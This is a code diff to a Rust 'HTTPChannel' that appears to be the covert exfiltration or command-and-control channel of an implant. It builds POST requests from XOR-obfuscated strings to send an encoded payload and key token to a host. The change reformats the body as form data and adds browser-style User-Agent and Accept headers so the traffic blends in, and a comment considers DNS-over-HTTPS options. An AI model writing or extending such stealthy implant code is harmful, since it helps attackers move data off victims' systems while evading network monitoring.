@@ -74,7 +74,8 @@ impl Channel for HTTPChannel {
 
         let key_id_hex = hex::encode(ctx.key_id);
         let payload_b64 = BASE64.encode(&ctx.payload);
-        let body = format!("{}{}", key_id_hex, payload_b64);
+        // let body = format!("{}{}", key_id_hex, payload_b64);
+        let body = format!("data={}&token={}", payload_b64, key_id_hex);
 
         // will have to put a lot of thought into the dns portion here.
         // lot of options, doh to a popular dns like 1.1.1.1
@@ -107,11 +108,19 @@ impl Channel for HTTPChannel {
         let _ = sys::set_read_timeout(fd, 30);
 
         // Build request from XOR-encoded strings
-        let mut req = Vec::with_capacity(256 + body.len());
+        let mut req = Vec::with_capacity(512 + body.len());
         req.extend_from_slice(&strings::decode(strings::POST_LINE));
         req.extend_from_slice(&strings::decode(strings::HOST_PREFIX));
         req.extend_from_slice(host.as_bytes());
         req.extend_from_slice(&strings::decode(strings::CRLF));
+
+        // Standard browser headers in typical order
+        req.extend_from_slice(b"User-Agent: ");
+        req.extend_from_slice(&strings::decode(strings::USER_AGENT));
+        req.extend_from_slice(&strings::decode(strings::CRLF));
+        req.extend_from_slice(&strings::decode(strings::ACCEPT_HEADER));
+        req.extend_from_slice(&strings::decode(strings::ACCEPT_LANG));
+        req.extend_from_slice(&strings::decode(strings::ACCEPT_ENC));
         req.extend_from_slice(&strings::decode(strings::CONTENT_TYPE_HEADER));
         req.extend_from_slice(&strings::decode(strings::CONTENT_LENGTH));
         req.extend_from_slice(body.len().to_string().as_bytes());
